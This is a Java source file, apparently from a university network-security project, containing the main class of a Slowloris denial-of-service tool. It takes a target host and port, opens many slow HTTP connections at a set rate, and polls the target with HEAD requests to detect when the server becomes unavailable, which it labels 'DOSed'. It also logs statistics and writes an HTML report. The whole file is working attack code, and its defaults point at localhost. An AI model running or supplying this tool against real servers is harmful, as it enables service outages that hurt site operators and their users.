package in.ac.iiitd.ns;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SlowLoris {

    public static final boolean DEBUG = false;

    // Global Parameters for statistics;
    private int pending;
    private int connected;
    private int closed;
    private boolean isAvailable;

    // Global parameters for attacking a hostname
    private final String hostname;
    private final int port;
    private final int connections;
    private final int interval;	
    private final int time;
    private final int rate;
    private final int timeout;
    public static String outDir;

    public static ArrayList<Stats> stats;

    /** List of Command Line Arguments */
    final static HashMap<String, String> CLA = new HashMap<String, String>();

    final static String USEAGE = "To Use the Tool please tweak the following Parameters as necessary\n"
            + "-h hostname\n"
            + "-p port\n"
            + "-c No_of_connections\n"
            + "-i Interval_Between_Headers_in_ms\n"
            + "-t test_Duration\n"
            + "-r connections_per_s\n"
            + "-d Output_directory\n"
            + "-o probe Timeout\n";

    private final ExecutorService exec;

    // Set Default Values 
    static{
        CLA.put("-h", "localhost");     // hostname
        CLA.put("-p", "80");            // port
        CLA.put("-c", "50");            // No. of connections
        CLA.put("-i", "10000");         // interval between headers
        CLA.put("-t", "120");            // Test Timeout in seconds
        CLA.put("-r", "50");            // Connections per seconds
        CLA.put("-d", "");              // Directory to output file
        CLA.put("-o", "5000");          // Ping Timeout
    }

    public static enum UPDATE_TYPE{
        ERROR, CLOSED, CONNECTED
    }

    private Runnable UPDATE_STATS = new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub
            for(int i = 0; ; i++){
                Stats S = new Stats(i, closed, pending, connected, isAvailable?connections:0);
                if(i%5 == 0){
                    Stats.printConsoleStats(S);
                }
                stats.add(S);
                try {
                    Thread.sleep(995);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    if(DEBUG)
                        e.printStackTrace();
                    break;
                }
            }
        }
    };

    private Runnable ping = new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub
            HttpURLConnection connection = null;
            while(true){
                try {
                    connection = (HttpURLConnection) new URL(hostname.startsWith("http://")?hostname:"http://" + hostname).openConnection();
                    connection.setConnectTimeout(timeout);
                    connection.setReadTimeout(timeout);
                    connection.setRequestMethod("HEAD");
                    int response = connection.getResponseCode();
                    if(DEBUG)
                        System.out.println(response);
                    clearDOSed();
                } catch (SocketTimeoutException e) {
                    setDOSed();
                } catch(IOException e){
                    if(DEBUG)
                        e.printStackTrace();
                }

                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    if(DEBUG)
                        e.printStackTrace();
                    break;
                }
            }
        }
    };

    public synchronized void update(UPDATE_TYPE type){

        switch(type){
            case CONNECTED: 
                //if(pending == 0) return;
                pending--;
                connected++;
                break;
            case CLOSED:
                //if(closed == connections) return;
                connected--;
                closed++;
                break;
            case ERROR:
                pending--;
                closed++;
                break;
            default: 
                break;
        }
    }

    public void setDOSed(){
        if(DEBUG){
            System.out.println("SERVER DOSed");
        }
        isAvailable = false;
    }

    public void clearDOSed(){
        if(DEBUG){
            System.out.println("SERVER OK");
        }
        isAvailable = true;
    }

    public SlowLoris(String[] args){
        processInput(args);
        exec = Executors.newCachedThreadPool();
        stats = new ArrayList<Stats>();

        this.hostname = CLA.get("-h");
        this.port = getCLAInt("-p");
        this.connections = getCLAInt("-c");
        this.interval = getCLAInt("-i");
        this.time = getCLAInt("-t") * 1000;
        this.rate = getCLAInt("-r");
        this.timeout = getCLAInt("-o");
        outDir = CLA.get("-d").endsWith("/")?CLA.get("-d"):CLA.get("-d") + "/";

        pending = connections;
        connected = 0;
        closed = 0;
        isAvailable = true;

        if(DEBUG){
            System.out.println("Values Set");
        }
    }

    public void attack(){
        if(DEBUG)
            System.out.println("Attack Started for Duration : " + time/1000 + "s");
        long sTime = System.currentTimeMillis() - 500;
        int i = 0;
        int conn = connections;
        Stats.printConsoleParam();
        // To perform Http PING repeatedly 
        Thread httpPing = new Thread(ping);
        httpPing.start();

        // To Save the network snapshots in the interval of 1s
        Thread US = new Thread(UPDATE_STATS);
        US.start();

        while(System.currentTimeMillis() - sTime < time){
            for(int r = 0; r < rate && conn > 0 && isAvailable; r++, conn--) {
                exec.execute(new Connection(hostname, port, interval, this, i += 3));
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                if(SlowLoris.DEBUG)
                    e.printStackTrace();
            }
        }

        httpPing.interrupt();
        US.interrupt();
        Stats.genHTML();
        exec.shutdownNow();
        Connection.update(null);
    }

    private static int getCLAInt(String key) {
        // TODO Auto-generated method stub
        return Integer.parseInt(CLA.get(key));
    }

    /**
     * Process the input and Sets the appropriate arguments It doesn't do any checks
     * @param args
     */
    private static void processInput(String[] args) {
        // TODO Auto-generated method stub
        
        if(args.length == 1 && args[0].equals("--h")){
            System.out.println(USEAGE);
            System.exit(0);
        }
        else if(args.length % 2 != 0){
            System.out.println(USEAGE);
            System.exit(0);
        } 
        else{
            for(int i = 0; i < args.length; i += 2){
                CLA.put(args[i], args[i+1]);
            }
        }

    }

}
